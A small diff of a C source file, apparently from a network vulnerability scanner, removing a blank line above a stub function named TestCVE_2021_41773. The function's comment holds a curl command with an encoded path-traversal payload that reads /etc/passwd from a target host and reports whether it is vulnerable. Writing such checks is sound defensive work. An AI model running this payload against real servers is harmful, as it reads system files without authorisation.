@@ -2,7 +2,6 @@
 #include "ToolsHTTP.h"
 #include "Network.h"
 
-
 BOOL TestCVE_2021_41773(char* ipAddress, int port, HTTP_STRUC httpStructPage){
 	// curl --silent --path-as-is --insecure "http://10.10.11.104/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep -q "root.*" && echo "Host is vulnerable" || echo "Host is Not vulnerable"
 	return FALSE;
